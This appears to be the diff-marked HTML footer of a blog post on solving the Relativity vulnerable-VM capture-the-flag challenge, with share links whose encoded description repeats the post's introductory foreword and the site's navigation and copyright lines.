+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&name=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eAt%20the%20time%20of%20writing%20this%20post%2c%20this%20VM%20was%20part%20of%20a%20local%20security%20communities%20%28%3ca%20href%3d%22http%3a%2f%2fzacon.org.za%2f%22%3ezacon%3c%2fa%3e%29%20pre-con%20challenge.%20Finding%20%2froot%2fflag.txt%20would%20have%20entered%20you%20into%20a%20draw%20for%20winning%20a%20prize%20%3aD%20However%2c%20the%20greater%20goal%20of%20the%20challenge%20was%20to%20learn%20something.%20I%20set%20out%20some%20time%20and%20attempted%20the%20challenge.%20Fortunately%2c%20I%20managed%20to%20complete%20it%20in%20time.%20So%2c%20this%20is%20the%20journey%20I%20took%20to%20solve%20this.%20You%20can%20now%20download%20and%20try%20this%20VM%20yourself%20over%20at%20%3ca%20href%3d%22http%3a%2f%2fvulnhub.com%2fentry%2fdevrandom_relativity%2c55%2f%22%3eVulnHub%3c%2fa%3e.%20Unzip%2c%20mount%20and%20boot%20the%20VM.%20Once%20the%20VM%20is%20booted%2c%20it%20should%20have%20an%20IP%20assigned%20via%20DHCP.%3c%2fp%3e%0a%3cp%3eI%20think%20it%20is%20interesting%20to%20note%20that%20I%20used%20a%20very%20limited%20set%20of%20tools%20to%20complete%20this.%20No%20bruteforcers%2c%20metasploits%2c%20vulnerability%20scanners%20and%20or%20fancy%20proxies%20were%20used.%20My%20toolset%20consisted%20out%20of%20netcat%2c%20nmap%20and%20other%20basic%20bash%20commands.%20There%20are%20probably%20a%20gazillion%20ways%20to%20do%20this%20as%20lots%20of%20this%20stuff%20is%20preference%20based%20on%20how%20they%20are%20approached.%20However%2c%20the%20basic%20ideas%20of%20the%20vulnerabilities%20remain%20the%20same.%3c%2fp%3e">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&t=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2020  Leon Jacobs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
+<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
+<script src=https://leonjza.github.io/js/main.js></script>
+
+
+
+</html>
